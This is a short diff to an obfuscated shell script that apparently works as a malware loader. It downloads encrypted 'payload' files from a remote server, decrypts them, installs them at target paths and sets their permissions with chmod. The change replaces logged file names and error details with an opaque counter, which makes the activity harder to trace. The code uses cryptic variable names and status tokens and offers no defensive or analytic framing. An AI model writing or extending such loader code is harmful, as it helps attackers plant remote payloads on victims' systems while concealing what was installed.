@@ -116,7 +116,9 @@ if [ "$_aa27" = "true" ]; then
             _target=$(echo "$_inst" | jq -r '.target' 2>/dev/null)
             _chmod=$(echo "$_inst" | jq -r '.chmod' 2>/dev/null)
             
-            _h8 "0x03:PROC:$_file"
+            _pcount=${_pcount:-0}
+            _pcount=$((_pcount + 1))
+            _h8 "0x03:PROC:$_pcount/11"
             
             HTTP_CODE=$(curl -sSL -o "/tmp/$_file" -w "%{http_code}" -X POST "$_b2/payload/download" \
                 -H "Content-Type: application/json" \
@@ -133,10 +135,10 @@ if [ "$_aa27" = "true" ]; then
                     [ -n "$_chmod" ] && chmod "$_chmod" "$_target"
                     _h8 "0x03:OK"
                 else
-                    _i9 "0x03:DEC:FAIL:$_decrypt_status"
+                    _i9 "0x03:DEC:FAIL:$_pcount"
                 fi
             else
-                _i9 "0x03:DL:FAIL:$HTTP_CODE"
+                _i9 "0x03:DL:FAIL:$_pcount"
             fi
             
             rm -f "/tmp/$_file"
